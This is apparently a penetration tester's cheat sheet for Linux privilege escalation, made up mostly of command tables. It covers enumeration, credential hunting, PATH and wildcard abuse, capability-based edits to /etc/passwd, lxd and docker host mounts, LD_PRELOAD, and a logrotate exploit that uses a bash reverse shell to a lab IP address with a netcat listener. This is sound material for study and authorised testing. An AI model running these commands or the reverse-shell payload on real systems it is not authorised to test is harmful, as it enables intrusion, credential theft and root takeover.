# Information Gathering

## -Environment Enumeration-

**Helper Scripts**

[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) | [LinEnum](https://github.com/rebootuser/LinEnum) | [Lynis](https://github.com/CISOfy/lynis)

| **Command**                                                              | **Description**                                                 |
| ------------------------------------------------------------------------ | --------------------------------------------------------------- |
| `whoami`                                                                 | Describes current user                                          |
| `id`                                                                     | Describes the groups that the current user belongs to           |
| `hostname`                                                               | What the is server named                                        |
| `ifconfig or ip -a`                                                      | What subnet the server is in                                    |
| `sudo -l`                                                                | can the user run anything with sudo                             |
| `cat /etc/os-release`                                                    | Check OS and version                                            |
| `echo $PATH`                                                             | Check the current users path                                    |
| `env`                                                                    | Check all environment variables for user                        |
| `uname -a`                                                               | Check the Kernel version                                        |
| `lscpu`                                                                  | Information about the host itself such as the CPU type/version  |
| `cat /etc/shells`                                                        | What login shells exist on the server                           |
| `lsblk`                                                                  | Look at the drives and any shares on the system                 |
| `lpstat`                                                                 | Find information about any printers attached to the system      |
| `cat /etc/fstab`                                                         | Check for mounted drive creds by grepping for username/password |
| `route or netstat -rn`                                                   | Check routing table                                             |
| `/etc/resolv.conf`                                                       | Useful for domain joined servers                                |
| `arp -a`                                                                 | Check the ARP table for other hosts                             |
| `cat /etc/passwd`                                                        | Find info about users on the system                             |
| `cat /etc/shadow`                                                        | Login info for users (unlikely to be readable without root)     |
| `cat /etc/group`                                                         | Find information about the system groups (and users)            |
| `getent group sudo`                                                      | Query group file for interesting groups/users                   |
| `ls -lisa /home`                                                         | ALWAYS check the home directory for current user and others     |
| `df -h`                                                                  | General information about the linux distro                      |
| `cat /etc/fstab \| grep -v "#" \| column -t`                             | Find unmounted file systems                                     |
| `find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null \| grep <USER>` | Find all hidden user files                                      |
| `find / -type d -name ".*" -ls 2>/dev/null`                              | Find all hidden directories                                     |
| `ls -lisa /tmp /var/tmp /dev/shm`                                        | Check tmp folders for scripts or other loot                     |

## -Linux Services & Internals Enumeration-

| **Command**                                                                                                                                                                              | **Description**                                                                      |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------ |
| `cat /etc/hosts`                                                                                                                                                                         | Describes current users hosts file                                                   |
| `lastlog`                                                                                                                                                                                | Find the last login time for user                                                    |
| `who or finger`                                                                                                                                                                          | Check if anyone is on the system at the same time                                    |
| `history`                                                                                                                                                                                | Check the users command history                                                      |
| `find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null`                                                                                                     | Find any special history files created by scripts/programs                           |
| `ls -la /etc/cron.daily/`                                                                                                                                                                | Show all daily cron jobs on the system                                               |
| `find /proc -name cmdline -exec cat {} \; 2>/dev/null\| tr " " "\n"`                                                                                                                     | Find information from proc/procfs file system on processes, hardware, etc            |
| `apt list --installed \| tr "/" " " \| cut -d" " -f1,3 \| sed 's/[0-9]://g' \| tee -a installed_pkgs.list`                                                                               | List of installed packages                                                           |
| `for i in $(curl -s https://gtfobins.github.io/ \| html2text \| cut -d" " -f1 \| sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done` | Bash one-liner that will compare installed binaries to GTFObins to investigate later |
| `sudo -V`                                                                                                                                                                                | Check the sudo version for known exploits                                            |
| `ls -l /bin /usr/bin/ /usr/sbin/`                                                                                                                                                        | Look for compiled binaries installed on system                                       |
| `ps aux \| grep root`                                                                                                                                                                    | Find services running as root user                                                   |
| `find / -type f -name "*.sh" 2>/dev/null \| grep -v "src\\\|snap\\\|share"`                                                                                                              | Find all scripts on system                                                           |
| `find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null`                                                                                                      | Find all configuration files                                                         |
| `strace ping -c1 <IP ADDR>`                                                                                                                                                              | Linix diagnostic tool to track and analyze system calls and signal processing        |

## -Credentials Hunting-

| **Command**                                                       | **Description**                                                      |
| ----------------------------------------------------------------- | -------------------------------------------------------------------- |
| `cat wp-config.php \| grep 'DB_USER\|DB_PASSWORD'`                | ALWAYS check web root for creds (example WP site MySQL SB)           |
| `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null` | Find spool or mail directories to check for creds                    |
| `ls ~/.ssh`                                                       | Check current user for SSH keys and known_hosts file to find targets |

# Environment-based Privilege Escalation

## -Path Abuse-

| **Command**                                          | **Description**                                                         |
| ---------------------------------------------------- | ----------------------------------------------------------------------- |
| `echo $PATH or env \| grep PATH`                     | Check the contents of the PATH variable                                 |
| `PATH=.:${PATH} && export PATH && echo $PATH`        | Add the '.' current dir to user's PATH to abuse PATH                    |
| `touch ls && echo 'echo "TEST"' > ls && chmod +x ls` | _Example of how path abuse can be used if current dir is added to PATH_ |

## -Wildcard Abuse-

This attack is based on the environment available. An example of this type of attack follows:

Take the following vulnerable cron job on the victim's system:

```
#
#
mh dom mon dow command
*/01 * * * * cd /root && tar -zcf /tmp/backup.tar.gz *
```

The wildcard in the cronjob can be abused when the attacker commands are written as file names. This causes the cronjob to run the attacker commands:

```
user@NIX02:~$ echo 'echo "cliff.moore ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
user@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
user@NIX02:~$ echo "" > --checkpoint=1
```

## -Escaping Restricted Shells-

**Types of restricted shells:**

[Restricted Bourne shell (rbash)](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html) | [Restricted Korn shell (rksh)](https://www.ibm.com/docs/en/aix/7.2?topic=r-rksh-command) | [Restricted Z shell (rzsh)](https://manpages.debian.org/experimental/zsh/rzsh.1.en.html)

When in a restricted shell there will be a pre-defined set of actions that are allowed. The first step in escaping is determining the capabilities of the shell.

Take the example scenario where the restricted shell only allows `ls -l` or `ls -a` to be run. In this case command injection may be possible to escape the shell by injecting additional commands into the args of the ls command.

```
Anon4Now@NIX[/home]$ ls -l `pwd`
```

This command would cause the ls command to be executed with the argument -l, followed by the output of the pwd command. Since the pwd command is not restricted by the shell, this would allow for the execution of the pwd command and seeing the current working directory, even though the shell does not allow us to execute the pwd command directly.

Other possible techniques:

- Command Substitution: This involves using the shell's command substitution syntax to execute a command.
- Command Chaining: Use multiple commands in a single command line, separated by a shell metacharacter, such as a semicolon (;) or a vertical bar (|), to execute a command.
- Environment Variables: Modifying or creating environment variables that the shell uses to execute commands that are not restricted by the shell.
- Shell Functions: Define and call shell functions that execute commands not restricted by the shell.

# Permissions-based Privilege Escalation

## -Special Permissions-

| **Command**                                                     | **Description**                 |
| --------------------------------------------------------------- | ------------------------------- |
| `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null` | Find binaries with SUID bit set |
| `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null` | Find binaries with SGID bit set |

## -Sudo Rights Abuse-

| **Command** | **Description**                           |
| ----------- | ----------------------------------------- |
| `sudo -l`   | Check if current user has sudo privileges |

## -Privileged Groups-

**LXC/LXD**

LXD is similar to Docker and is Ubuntu's container manager. If the user is part of the 'lxd' group, this may be an opportunity for privilege escalation.

Reference the below section Containers on how to potentially exploit this group.

```
devops@NIX02:~$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

**Docker**

Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers.

Reference the below section Containers on how to potentially exploit this group.

```
docker-user@nix02:~$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

**Disk**

Users within the disk group have full access to any devices contained within /dev, such as /dev/sda1, which is typically the main device used by the operating system. An attacker with these privileges can use debugfs to access the entire file system with root level privileges.

```
devops@NIX02:~$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(disk)
```

**ADM**

Members of the adm group are able to read all logs stored in /var/log. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.

```
secaudit@NIX02:~$ id

uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```

## -Capabilities-

Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted.

| **Capability**       | **Description**                                                                                                                                           |
| -------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| cap_sys_admin        | Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.                                     |
| cap_sys_chroot`      | Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.            |
|                      |
| cap_sys_ptrace       | Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes. |
| cap_sys_nice         | Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.               |
| cap_sys_time         | Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.                |
| cap_sys_resource     | Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.       |
|                      |
| cap_sys_module       | Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.      |
| cap_net_bind_service | Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.                         |

| **Command**                                                                         | **Description**                                                          |
| ----------------------------------------------------------------------------------- | ------------------------------------------------------------------------ |
| `find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;` | Find binaries on the system and show the capabilities that have been set |

_Example below of how capabilities could be used to escalate privileges:_

Check the capabilities of the binary.

```
Anon4Now@NIX[/home]$ getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
```

Read the first entry in passwd file.

```
Anon4Now@NIX[/home]$ cat /etc/passwd | head -n1

root:x:0:0:root:/root:/bin/bash
```

Use the cap_sys_admin capability of the /usr/bin/vim binary to modify a system file:

```
Anon4Now@NIX[/home]$ /usr/bin/vim.basic /etc/passwd
```

Modify the first entry in the passwd file to remove the 'x' in the line (allows for login without pass).

```
Anon4Now@NIX[/home]$ echo -e ':%s/^root:[^:]*:/root::/\nwq' | /usr/bin/vim.basic -es /etc/passwd
Anon4Now@NIX[/home]$ cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash
```

Switch user to root.

```
Anon4Now@NIX[/home]$ su -
```

# Service-based Privilege Escalation

## -Vulnerable Services-

Always check the versions of the services that are running, to determine whether a known exploit exists.

| **Command**                                | **Description**                            |
| ------------------------------------------ | ------------------------------------------ |
| `systemctl --type=service --state=running` | Find running services to check versions on |

## -Cron Job Abuse-

| **Command**                                                   | **Description**                                                                                                         |
| ------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null` | Look for writeable files or directories, specifically scripts                                                           |
| `./pspy64 -pf -i 1000`                                        | Run [pspy](https://github.com/DominicBreuker/pspy) to view running processes, commands by other users, cronjobs, etc... |

## -Containers-

**LXC/LXD**

To exploit either lxc or lxd, the attacker needs to be able to run a container on the target machine. This can be accomplished by either transferring a container image to the target, or finding an image leftover from the sysadmin. From there the following commands (or similar) can be run to escalate privileges.

Requires group privileges to run:

```
container-user@nix02:~$ id

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

| **Command**                                                                                    | **Description**                                                     |
| ---------------------------------------------------------------------------------------------- | ------------------------------------------------------------------- |
| `lxc image import <IMAGE_NAME> --alias <ALIAS_NAME>`                                           | Import an image file into LXC (e.g., ubuntu-template.tar.xz)        |
| `lxc image list`                                                                               | List the container images on the server                             |
| `lxc init <ALIAS_NAME> <CONTAINER_NAME> -c security.privileged=true`                           | Initiate the image with the 'security.privileged=true' flag         |
| `lxc config device add <CONTAINER_NAME> host-root disk source=/ path=/mnt/root recursive=true` | Update the image config for mounting the container on the root path |
| `lxc start <CONTAINER_NAME>`                                                                   | Start the container                                                 |
| `lxc exec <CONTAINER_NAME> /bin/bash`                                                          | Log into running container with bash                                |
| `ls -l /mnt/root`                                                                              | Check the mounted host machine file directory                       |

**Linux Docker**

To escalate privileges the attacker needs to be in the docker group (shown below), in the sudoers file, or docker needs to have the SUID bit set. If any of these scenarios are present, the attacker can control the docker daemon and access the root file system. A docker image must either be present on the machine or one must be transferred.

```
docker-user@nix02:~$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

| **Command**                                                   | **Description**                                                                           |
| ------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
| `docker image ls`                                             | List the docker images on the host                                                        |
| `docker run -v /:/mnt --rm -it <IMAGE_NAME> chroot /mnt bash` | Run a container from the image, mount to the host directory, and shell into the container |
| `ls -l /mnt`                                                  | Check the mounted host machine file directory                                             |

**Docker Socket**

A case that can also occur is when the Docker socket is writable. Usually this socket is located in /var/run/docker.sock, however the location can differ. This location can only be written by root or docker group, which if the attacker acts as a user not in one of these two groups and the Docker socket still has the privileges to be writable, then it should provide an opportunity to escalate privileges.

| **Command**                                                                                  | **Description**                                                    |
| -------------------------------------------------------------------------------------------- | ------------------------------------------------------------------ |
| `docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it <IMAGE_NAME> chroot /mnt bash` | Run as a user not in root or docker group, mount to host, and bash |
| `ls -l /mnt`                                                                                 | Check the mounted host machine file directory                      |

## -Logrotate-

Logrotate is the Linux program tasked with managing the accumulation of log files on the machine to prevent the hard disk from overflowing. It accomplishes this by either renaming the file '.old' or emptying the file contents.

To exploit logrotate, there are some pre-requisites the must be met:

- The attacker needs write permissions on the log files
- Logrotate must run as a privileged user or root
- Logrotate has to be a vulnerable version:
  - 3.8.6
  - 3.11.0
  - 3.15.0
  - 3.18.0

If the above requirements are met, the pre-fabricated exploit [logrotten](https://github.com/whotwagner/logrotten) can be used on the target machine.

| **Command**                                                             | **Description**                                                                    |
| ----------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
| `git clone https://github.com/whotwagner/logrotten.git && cd logrotten` | Download the exploit repo and cd into it                                           |
| `gcc logrotten.c -o logrotten`                                          | Compile the source code                                                            |
| `echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload`             | Generate payload (IT DOES NOT NEED TO BE THE EXAMPLE ONE)                          |
| `grep "create\|compress" /etc/logrotate.conf \| grep -v "#"`            | Determine the function used by logrotate (necessary to select the correct exploit) |
| `nc -nlvp <PORT>`                                                       | Start netcat on attacker machine to catch reverse shell                            |
| `./logrotten -p ./payload /tmp/tmp.log`                                 | Run exploit on target machine and wait for shell                                   |

## -Misc Techniques-

# Linux Internals-based Privilege Escalation

## Kernel Exploits

## Shared Libraries

## Shared Object Hijacking

## Python Library Hijacking

# Recent 0-Days (as of 6-16-23)

## Sudo

## Polkit

## Dirty Pipe

## Netfilter

| **Command**                                                                         | **Description**                                       |
| ----------------------------------------------------------------------------------- | ----------------------------------------------------- |
| `ssh htb-student@<target IP>`                                                       | SSH to lab target                                     |
|  `ps aux \| grep root`                                                              | See processes running as root                         |
| `ps au`                                                                             | See logged in users                                   |
| `ls /home`                                                                          | View user home directories                            |
| `ls -l ~/.ssh`                                                                      | Check for SSH keys for current user                   |
| `history`                                                                           | Check the current user's Bash history                 |
| `sudo -l`                                                                           | Can the user run anything as another user?            |
| `ls -la /etc/cron.daily`                                                            | Check for daily Cron jobs                             |
| `lsblk`                                                                             | Check for unmounted file systems/drives               |
| `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null`                       | Find world-writeable directories                      |
| `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`                       | Find world-writeable files                            |
| `uname -a`                                                                          | Check the Kernel versiion                             |
| `cat /etc/lsb-release `                                                             | Check the OS version                                  |
| `gcc kernel_expoit.c -o kernel_expoit`                                              | Compile an exploit written in C                       |
| `screen -v`                                                                         | Check the installed version of `Screen`               |
| `./pspy64 -pf -i 1000`                                                              | View running processes with `pspy`                    |
| `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`                     | Find binaries with the SUID bit set                   |
| `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null`                     | Find binaries with the SETGID bit set                 |
| `sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root` | Priv esc with `tcpdump`                               |
| `echo $PATH`                                                                        | Check the current user's PATH variable contents       |
| `PATH=.:${PATH}`                                                                    | Add a `.` to the beginning of the current user's PATH |
| `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null`                   | Search for config files                               |
| `ldd /bin/ls`                                                                       | View the shared objects required by a binary          |
| `sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart`                            | Escalate privileges using `LD_PRELOAD`                |
| `readelf -d payroll  \| grep PATH`                                                  | Check the RUNPATH of a binary                         |
| `gcc src.c -fPIC -shared -o /development/libshared.so`                              | Compiled a shared libary                              |
| `lxd init`                                                                          | Start the LXD initialization process                  |
| `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine`                  | Import a local image                                  |
| `lxc init alpine r00t -c security.privileged=true`                                  | Start a privileged LXD container                      |
| `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true`      | Mount the host file system in a container             |
| `lxc start r00t`                                                                    | Start the container                                   |
| `showmount -e 10.129.2.12`                                                          | Show the NFS export list                              |
| `sudo mount -t nfs 10.129.2.12:/tmp /mnt`                                           | Mount an NFS share locally                            |
| `tmux -S /shareds new -s debugsess`                                                 | Created a shared `tmux` session socket                |
| `./lynis audit system`                                                              | Perform a system audit with `Lynis`                   |
